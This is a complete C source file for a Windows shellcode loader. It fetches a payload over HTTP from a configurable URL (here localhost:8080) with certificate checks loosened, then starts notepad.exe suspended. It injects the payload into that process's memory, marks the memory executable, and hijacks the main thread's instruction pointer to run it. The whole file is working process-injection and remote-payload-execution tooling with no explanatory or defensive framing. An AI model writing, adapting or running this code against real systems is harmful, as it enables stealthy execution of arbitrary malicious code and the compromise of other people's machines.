#include <windows.h>
#include <stdio.h>
#include <wininet.h>

PBYTE GetPayload(OUT size_t* sPayloadSize);
HANDLE SpawnProcess(OUT HANDLE* hpProcess);
BOOL HijackThread(IN HANDLE hThread, IN PVOID pvPayloadAddress);
PVOID InjectPayload(IN HANDLE hProcess, IN PBYTE pbPayload, size_t sPayloadSize);

const wchar_t cc[] = L"http://localhost:8080/payload.bin";

int main() {
    PBYTE pbPayload;
    PVOID pvPayloadAddress;
    HANDLE hThread, hProcess;
    size_t sPayloadSize;

    if ((pbPayload = GetPayload(&sPayloadSize)) == NULL) {
        return -1;
    }
    if ((hThread = SpawnProcess(&hProcess)) == NULL) {
        return -1;
    }
    if ((pvPayloadAddress = InjectPayload(hProcess, pbPayload, sPayloadSize)) == NULL) {
        return -1;
    }
    printf("[#] Press enter to hijack thread\n");
    getchar();
    if (!HijackThread(hThread, pvPayloadAddress)) {
        return -1;
    }

    printf("Done, goodbye!\n");
}

PVOID InjectPayload(IN HANDLE hProcess, IN PBYTE pbPayload, size_t sPayloadSize) {
    PVOID pvPayloadAddress;
    if ((pvPayloadAddress = VirtualAllocEx(hProcess, NULL, sPayloadSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE)) == NULL) {
        printf("[!] Could not allocate memory, error: %d\n", GetLastError());
        return NULL;
    }

    size_t sBytesWritten;
    if (!WriteProcessMemory(hProcess, pvPayloadAddress, pbPayload, sPayloadSize, &sBytesWritten)) {
        printf("[!] Could not write payload into process, error: %d\n", GetLastError());
        return NULL;
    }

    memset(pbPayload, 0x0, sPayloadSize);
    free(pbPayload);

    DWORD dwOldProtect;

    if (!VirtualProtectEx(hProcess, pvPayloadAddress, sPayloadSize, PAGE_EXECUTE, &dwOldProtect)) {
        printf("[!] Could not change protection of virtual memory in process, error: %d\n", GetLastError());
        return NULL;
    }

    return pvPayloadAddress;
}

BOOL HijackThread(IN HANDLE hThread, IN PVOID pvPayloadAddress) {
    CONTEXT	cThreadContext = {
		.ContextFlags = CONTEXT_CONTROL
	};

    if (!GetThreadContext(hThread, &cThreadContext)) {
        printf("[!] Could not get thread context, error: %d\n", GetLastError());
        return FALSE;
    }

    cThreadContext.Rip = (DWORD64) pvPayloadAddress;

    if (!SetThreadContext(hThread, &cThreadContext)) {
        printf("[!] Could not set thread context, error: %d\n", GetLastError());
        return FALSE;
    }


    printf("[+] Succesfully hijacked thread. \n[+] Executing thread and awaiting termination\n");

    if ((ResumeThread(hThread)) == -1) {
        printf("[!] Could not resume thread, error: %d\n", GetLastError());
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);

    printf("[+] Thread terminated\n");

    return TRUE;
}


PBYTE GetPayload(OUT size_t* spPayloadSize) {
    PBYTE pbPayload;
    HINTERNET hInternet, hUrl;
    DWORD dwBytesRead;
    *spPayloadSize = 0;

    if ((hInternet = InternetOpenW(NULL, 0, NULL, NULL, 0)) == NULL) {
        printf("[!] Could not open Internet Handle, error: %d\n", GetLastError());
        return NULL;
    }
    if ((hUrl = InternetOpenUrlW(hInternet, cc, NULL, 0, (INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_HYPERLINK), 0)) == NULL) {
        printf("[!] Could not open Url Handle, error: %d\n", GetLastError());
        CloseHandle(hInternet);
        return NULL;
    }

    pbPayload = (PBYTE)malloc(1024);

    while (TRUE)
    {
        if (!InternetReadFile(hUrl, pbPayload, 1024, &dwBytesRead)) {
            printf("[!] Could not read internet file, error: %d\n", GetLastError());
            free(pbPayload);
            CloseHandle(hInternet);
            CloseHandle(hUrl);
            return NULL;
        }
        *spPayloadSize += dwBytesRead;

        if (dwBytesRead < 1024)
        {
            pbPayload = (PBYTE)realloc(pbPayload, *spPayloadSize);
            break;
        } else {
            pbPayload = (PBYTE)realloc(pbPayload, *spPayloadSize + 1024);
        }
    }
    
    CloseHandle(hInternet);
    CloseHandle(hUrl);

    printf("[+] Succesfully transferred payload of size: %d bytes\n", *spPayloadSize);
    return pbPayload;
}

HANDLE SpawnProcess(OUT HANDLE* hpProcess) {
    STARTUPINFOW Si = {
        .cb = sizeof(STARTUPINFO)
    };

    PROCESS_INFORMATION Pi = {0};

    if (!CreateProcessW(L"C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &Si, &Pi)) {
        printf("[!] Could not create process, error: %d\n", GetLastError());
        return NULL;
    }

    printf("[+] Sucessfully spawned suspended process with PID %d and main TID %d\n", Pi.dwProcessId, Pi.dwThreadId);
    *hpProcess = Pi.hProcess;
    return Pi.hThread;
}